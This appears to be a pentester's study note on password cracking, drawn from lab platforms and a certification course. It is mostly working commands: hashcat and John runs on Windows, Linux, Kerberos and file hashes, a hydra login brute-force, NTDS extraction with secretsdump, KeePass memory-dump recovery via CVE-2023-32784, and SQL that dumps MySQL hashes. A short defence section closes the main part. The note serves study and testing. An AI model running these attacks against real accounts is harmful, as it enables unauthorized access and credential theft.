---
title: "Password Cracking"
type: technique
tags: [htb, linux, password-cracking, post-exploitation, windows]
phase: post-exploitation
date_created: 2026-05-08
date_updated: 2026-08-13
sources: [cpts-password-attacks, cve-2023-32784]
---

# Password Cracking

## What it is

Password cracking is the process of recovering plaintext passwords from their stored hash values using techniques such as dictionary attacks, brute-force, and rule-based transformations. Attackers use it after obtaining hashes from credential stores such as SAM, NTDS.dit, LSASS, or `/etc/shadow`.

## How it works

Hash functions are one-way mathematical transformations — the original input cannot be derived from the output alone. Cracking works by generating candidate passwords, hashing each one with the same algorithm, and comparing the result against the captured hash. Salting (adding a random value before hashing) defeats pre-computed rainbow tables, but offline cracking against captured hashes remains feasible for weak passwords.

**Common hash types encountered:**

| Hash | Context | Hashcat mode | JtR format |
|------|---------|-------------|------------|
| MD5 | Web apps, old Linux | 0 | raw-md5 |
| SHA-256 | Linux, web apps | 1400 | raw-sha256 |
| SHA-512crypt (`$6$`) | Modern Linux shadow | 1800 | sha512crypt |
| NTLM (NT hash) | Windows SAM/NTDS | 1000 | nt |
| LM hash | Legacy Windows | 3000 | lm |
| NTLMv2 (NetNTLMv2) | Captured challenge-response | 5600 | netntlmv2 |
| DCC2 (MS Cache v2) | Domain-joined offline cache | 2100 | mscach2 |
| Kerberoast TGS (RC4) | Kerberoasting | 13100 | krb5tgs |
| BitLocker | Volume encryption | 22100 | — |
| Yescrypt (`$y$`) | Modern Debian/Ubuntu | 7400 | yescrypt |
| SHA-1crypt (`$sha1$`) | Older Linux | — | sha1crypt |

**Linux shadow ID prefixes:** `$1$`=MD5, `$2a$`=Blowfish, `$5$`=SHA-256, `$6$`=SHA-512, `$y$`=Yescrypt

## Mutating a known/leaked seed (hint passwords)

When recon or source disclosure hands you a labelled secret (`$MASTER_PASSWORD`, `$API_KEY`, a
default, a username) that FAILS as a literal credential, treat it as a SEED and rule-mutate it
before assuming decoy or running a full wordlist. Generate candidates, then brute the real login:

```bash
echo 'support@110' | hashcat --stdout -r /usr/share/hashcat/rules/best64.rule > cand.txt
echo 'support@110' | hashcat --stdout -r /usr/share/hashcat/rules/toggles5.rule >> cand.txt
# add manual variants: @/symbol-drop, case, year/number swaps, trailing !/#/1/2026 ; sort -u
hydra -l <user> -P cand.txt <host> http-post-form '/index.php:email=^USER^&password=^PASS^:Invalid' -t 16 -f
```

Real example (THM Support panel): leaked `$MASTER_PASSWORD='support@110'` failed everywhere; the
admin password was the mutation **`support110`** (the `@` dropped). Plain rockyou estimated ~40h and
never reached it; the mutated seed cracked it in 2 guesses. The same applies to hashes: if you know
the user reuses a leaked seed, `hashcat -a 0 hash cand.txt` (or `-r` rules on the seed) before a
full `rockyou` run.

## Prerequisites

- Captured password hashes (from SAM, NTDS, LSASS dump, `/etc/shadow`, network capture)
- Wordlists (e.g., `rockyou.txt`, SecLists)
- Sufficient compute resources (GPU preferred for Hashcat)

## Methodology

### 1. Identify the hash format

```bash
# hashID with JtR format suggestion
hashid -j '$6$rounds=5000$abc$hash...'

# hashID with Hashcat mode suggestion
hashid -m '$1$FNr44XZC$wQxY6HHLrgrGX0e1195k.1'
```

Alternatively, consult:
- Hashcat example hashes: `hashcat --help | grep -i ntlm`
- JtR sample hashes: https://openwall.info/wiki/john/sample-hashes

### 2. Dictionary attack (most common starting point)

```bash
# Hashcat dictionary attack (-a 0)
hashcat -a 0 -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt

# With rules (best64 applies common transformations)
hashcat -a 0 -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# JtR wordlist mode
john --wordlist=/usr/share/wordlists/rockyou.txt --format=nt hashes.txt
```

### 3. Mask / brute-force attack

```bash
# Hashcat mask attack (-a 3)
# Charset symbols: ?l=lowercase ?u=uppercase ?d=digit ?s=special ?a=all printable
hashcat -a 3 -m 1000 hashes.txt '?u?l?l?l?l?d?s'

# 8-char alphanumeric
hashcat -a 3 -m 0 hash.txt '?a?a?a?a?a?a?a?a'
```

### 4. Rule-based / hybrid attack

```bash
# Create custom rule file
cat custom.rule
# :           (do nothing)
# c           (capitalise first)
# so0         (substitute o->0)
# sa@         (substitute a->@)
# $!          (append !)
# $1$9$9$8    (append 1998)

# Generate mutated wordlist
hashcat --force password.list -r custom.rule --stdout | sort -u > mut_password.list

# Attack with mutated list
hashcat -a 0 -m 1000 hashes.txt mut_password.list

# JtR with rules
john --wordlist=rockyou.txt --rules hashes.txt
```

### 5. Custom wordlist generation (CeWL)

```bash
# Scrape website for company-specific words
cewl https://www.inlanefreight.com -d 4 -m 6 --lowercase -w inlane.wordlist
```

**OSINT combinator: build the candidate from the target's OWN leaked shape, not rockyou.** When
OSINT (a public profile, a fake-social app on the target, a bio field) yields personal facts (a pet
name, a birth year, a hobby) AND a separate leak reveals the SHAPE of an old password (e.g.
`word+number`, `Name!Year`), combine the OSINT facts into that exact shape rather than grinding a
generic wordlist — the target reuses their own pattern, not a random rockyou hit. A tiny hand-built
combinator list of 10-50 candidates in the confirmed shape beats a multi-hour rockyou run.

### 6. Crack specific hash types

```bash
# NTLM (Windows)
hashcat -a 0 -m 1000 ntlm_hashes.txt rockyou.txt

# SHA-512crypt (Linux shadow)
hashcat -m 1800 -a 0 unshadowed.hashes rockyou.txt

# DCC2 (domain cached credentials)
hashcat -m 2100 '$DCC2$10240#administrator#23d97555...' rockyou.txt

# NTLMv2 (captured via Responder)
hashcat -m 5600 ntlmv2_hash.txt passwords.txt

# Kerberoast TGS
hashcat -m 13100 tgs_hash.txt rockyou.txt

# BitLocker
hashcat -a 0 -m 22100 '$bitlocker$0$16$...' rockyou.txt
```

### 7. Cracking Linux credentials

```bash
# Combine passwd and shadow into unshadow format
unshadow /tmp/passwd.bak /tmp/shadow.bak > /tmp/unshadowed.hashes

# Crack with hashcat (SHA-512crypt = mode 1800)
hashcat -m 1800 -a 0 /tmp/unshadowed.hashes rockyou.txt

# JtR single crack mode (uses username/GECOS info)
john --single unshadow.txt

# JtR wordlist mode
john --wordlist=rockyou.txt unshadow.txt
```

### 8. Cracking protected files

```bash
# SSH private keys
ssh2john.py SSH.private > ssh.hash
john --wordlist=rockyou.txt ssh.hash

# Office documents
office2john.py Protected.docx > protected-docx.hash
john --wordlist=rockyou.txt protected-docx.hash

# PDF files
pdf2john.py PDF.pdf > pdf.hash
john --wordlist=rockyou.txt pdf.hash

# ZIP archives
zip2john ZIP.zip > zip.hash
john --wordlist=rockyou.txt zip.hash

# KeePass (KDBX 1/2 = AES-KDF only)
keepass2john Database.kdbx > keepass.hash
john --wordlist=rockyou.txt keepass.hash          # or hashcat -m 13400
# KDBX 4.x (Argon2): keepass2john/hashcat-13400 FAIL -> "File version '40000' not supported".
# Crack the Argon2 KDF directly instead (pykeepass; rate is Argon2-param dependent, ~1-60/s):
#   pip install --break-system-packages pykeepass
#   python3 -c 'from pykeepass import PyKeePass
#   for p in open("rockyou.txt",encoding="latin-1"):
#       try: PyKeePass("db.kdbx",password=p.strip()); print("MASTER:",p); break
#       except: pass'
# DON'T-WASTE-TIME gotcha (THM Forward): if pykeepass rejects EVERY password (even the right one),
# the DB is NOT password-protected - it uses a NON-password key source. Check KeePass.config.xml:
#   <KeySources><Association>...<UserAccount>true</UserAccount>  -> keyed to the WINDOWS USER ACCOUNT
#   (DPAPI of a specific user). It is UNCRACKABLE offline. Open KeePass ON the box AS that user
#   (their DPAPI unlocks it): `start "" KeePass.exe db.kdbx` -> master-key dialog shows only "Windows
#   user account" ticked -> OK. Read entries via double-click + the `...` reveal button (screenshot;
#   headless RDP clipboard is unreliable). A <KeyFile> association means find the .key/.keyx instead.

# KeePass master password from a MEMORY DUMP (CVE-2023-32784, KeePass 2.x < 2.54).
# The masked master-password box leaves residual UTF-16 strings in process memory:
# EVERY character except the FIRST is recoverable, no cracking needed. Dump + recover:
#   procdump.exe -accepteula -ma <keepass-pid> ks.dmp     # or Task Manager > Create dump file
#   git clone https://github.com/CMEPW/keepass-dump-masterkey
#   python3 keepass-dump-masterkey/poc.py ks.dmp          # -> "?NoWaYIcanF0rGetThis123" (? = leading ●)
# The leading ● is the ONE unrecoverable char. Brute just that char against the kdbx:
#   python3 -c 'import string;from pykeepass import PyKeePass
#   body="NoWaYIcanF0rGetThis123"                          # the recovered tail from poc.py
#   for c in string.printable:
#       try: PyKeePass("db.kdbx",password=c+body); print("PW:",c+body); break
#       except: pass'
# When you have both a .kdbx AND a process/memory dump, this beats cracking the Argon2 KDF.

# OpenSSL-encrypted GZIP
for i in $(cat rockyou.txt); do openssl enc -aes-256-cbc -d -in GZIP.gzip -k $i 2>/dev/null | tar xz; done

# BitLocker VHD
bitlocker2john -i Backup.vhd > backup.hashes
grep "bitlocker\$0" backup.hashes > backup.hash
hashcat -a 0 -m 22100 backup.hash rockyou.txt
```

## Key payloads / examples

```bash
# Full workflow: SAM NT hashes
hashcat -m 1000 hashestocrack.txt /usr/share/wordlists/rockyou.txt --show

# Full workflow: NTDS.dit NT hashes
impacket-secretsdump -ntds NTDS.dit -system SYSTEM LOCAL | grep ":::" | cut -d: -f4 > ntds_nthashes.txt
hashcat -a 0 -m 1000 ntds_nthashes.txt rockyou.txt

# Check cracked passwords
hashcat -m 1000 hashes.txt rockyou.txt --show

# JtR show cracked
john --show hashes.txt
```

## Bypasses and variants

| Technique | Description |
|-----------|-------------|
| Hybrid attack (`-a 6`) | Wordlist + mask (e.g., `password2024!`) |
| Combinator attack (`-a 1`) | Two wordlists combined |
| Prince attack | Statistically ordered combinations |
| Toggle case (`-a 0 -r toggles5.rule`) | Toggles character cases |
| PRINCE + rules | Statistically likely mutations |
| Targeted OSINT wordlist | CeWL + personal info (birth date, pet names, company) |

**Custom rule syntax reference:**

| Function | Description |
|----------|-------------|
| `:` | Do nothing |
| `l` | Lowercase all |
| `u` | Uppercase all |
| `c` | Capitalise first |
| `C` | Lowercase first, uppercase rest |
| `t` | Toggle all |
| `sXY` | Replace X with Y |
| `$X` | Append character X |
| `^X` | Prepend character X |
| `d` | Duplicate word |

## Detection and defence

- Monitor for large-scale authentication failures against AD (Event ID 4625, 4771)
- Enforce strong password policies (length ≥ 15, complexity, breached-password checks)
- Enable multi-factor authentication
- Use LAPS for local admin passwords to prevent hash reuse
- Enable Credential Guard to protect LSASS
- Audit and restrict access to SAM, NTDS.dit, and shadow files
- Use modern, slow hashing algorithms (bcrypt, Argon2) for application passwords

## Tools

- Hashcat — GPU-accelerated hash cracker, supports 300+ algorithms
- John the Ripper — Versatile CPU-based cracker with auto-detection
- hashID — Hash format identifier with JtR/Hashcat mode suggestions
- CeWL — Website word scraper for targeted wordlists
- Impacket — `secretsdump.py` for offline SAM/NTDS extraction
- pypykatz — Python Mimikatz implementation for LSASS parsing
- unshadow — Combines `/etc/passwd` and `/etc/shadow` for JtR

## Sources

- CPTS Password Attacks module (HTB Academy)
- CPTS sections: Intro to Password Cracking, John, Hashcat, Custom Wordlists, SAM/LSASS/NTDS extraction, Linux auth

## MySQL 8 `caching_sha2_password` (`$A$005$...`) -> hashcat -m 7401

`mysql.user.authentication_string` on MySQL 8 is `$A$<iter>$<20-byte salt><43-char digest>`, where
the salt is RAW BYTES (often non-printable, and it can contain a newline that breaks a line-based
hash file). Hashcat mode 7401 wants a different layout: `$mysql$A$005*<salt-hex>*<digest-hex>`.

Any account with `SELECT` on `mysql.user` can dump them; convert in SQL so the raw bytes never
have to survive a shell:

```sql
SELECT user, CONCAT('$mysql', SUBSTR(authentication_string,1,3),
    LPAD(CONV(SUBSTR(authentication_string,4,3),16,10),4,0),
    '*', INSERT(HEX(SUBSTR(authentication_string,8)),41,0,'*')) AS hash
FROM mysql.user
WHERE plugin = 'caching_sha2_password'
  AND authentication_string NOT LIKE '%INVALIDSALTANDPASSWORD%';
```

`HEX(SUBSTR(...,8))` hexes salt+digest together; inserting `*` at offset 41 splits after the
20-byte salt. The `NOT LIKE` drops the `mysql.infoschema`/`session`/`sys` placeholder rows.

```sh
hashcat -m 7401 -a 0 dev.hash /usr/share/wordlists/rockyou.txt
```

Gotchas:
- It is sha256crypt with 5000 iterations, so it is SLOW (low thousands of H/s on CPU). Cut the
  file to the one interesting account rather than cracking every row.
- `root@localhost` is usually `auth_socket` (empty `authentication_string`) - it is not crackable
  and does not need to be: it means the OS root user logs in without a password.
- An account in `mysql.user` that no application config references is a deliberate lead; DBMS
  passwords are prime candidates for OS-account reuse (see [[linux-privesc]]).

<!-- promoted-slug: mysql-caching-sha2-cracking -->
